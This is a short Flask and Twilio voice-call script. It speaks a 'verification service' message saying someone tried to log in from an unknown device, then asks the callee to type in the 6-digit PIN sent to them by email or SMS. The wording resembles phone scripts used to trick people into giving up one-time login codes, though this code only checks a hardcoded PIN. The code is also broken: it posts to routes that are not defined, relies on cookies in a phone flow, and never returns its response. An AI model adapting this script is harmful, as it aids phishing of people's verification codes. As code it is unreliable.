from flask import Flask, request
from twilio.twiml.voice_response import VoiceResponse, Gather

app = Flask(__name__)

@app.route("/voice", methods=['GET', 'POST'])
def voice():
    response = VoiceResponse()
    
    if request.method == 'POST':
        if 'Digits' in request.form:
            digits = request.form['Digits']
            if 'pin_entered' in request.cookies:
                # handle option input
                if digits == '1':
                    response.say('You selected option 1.')
                elif digits == '2':
                    response.say('You selected option 2.')
                elif digits == '3':
                    response.say('You selected option 3.')
                else:
                    response.say('Invalid input. Please try again.')
                    gather = Gather(num_digits=1, action='/handle-option', method='POST')
                    gather.say('To allow access from unknown device "MY ANDRIOD" please press 1. To deny access from unknown device "MY ANDRIOD" please press 2. To deny and block all request for any future actions from unknown device "MY ANDRIOD" please press 3. To end this call, please hang up.')
                    response.append(gather)
            else:
                # handle PIN input
                if digits == '123456':  # replace with your own PIN
                    response.say('Thank you for verifying your account.')
                    gather = Gather(num_digits=1, action='/handle-option', method='POST')
                    gather.say('To allow access from unknown device "MY ANDRIOD" please press 1. To deny access from unknown device "MY ANDRIOD" please press 2. To deny and block all request for any future actions from unknown device "MY ANDRIOD" please press 3. To end this call, please hang up.')
                    response.append(gather)
                    response.set_cookie('pin_entered', 'true')
                else:
                    response.say('Invalid PIN. Please try again.')
                    gather = Gather(num_digits=6, action='/handle-pin', method='POST')
                    gather.say('Hello, and welcome to our verification service. You are receiving this call because someone has tried to log in to your account on an unknown device. For your security purposes, please enter the 6-digit PIN number that you received either by email or SMS/text to resolve these security measures. After you have typed in the correct 6-digit PIN please press the pound key.')
                    response.append(gather)
        else:
            # handle initial call
            gather = Gather(num_digits=6, action='/handle-pin', method='POST')
            gather.say('Hello, and welcome to our verification service. You are receiving this call because someone has tried to log in to your account on an unknown device. For your security purposes, please enter the 6-digit PIN number that you received either by email or SMS/text to resolve these security measures. After you have typed in the correct 6-digit PIN please press the pound key.')
            response.append(gather)
    else:
        # handle initial call
        gather = Gather(num_digits=6, action='/handle-pin', method='POST')
        gather.say('Hello, and welcome to our verification service. You are receiving this call because someone has tried to log in to your account on an unknown device. For your security purposes, please enter the 6-digit PIN number that you received either by email or SMS/text to resolve these security measures. After you have typed in the correct 6-digit PIN please press the pound key.')
       
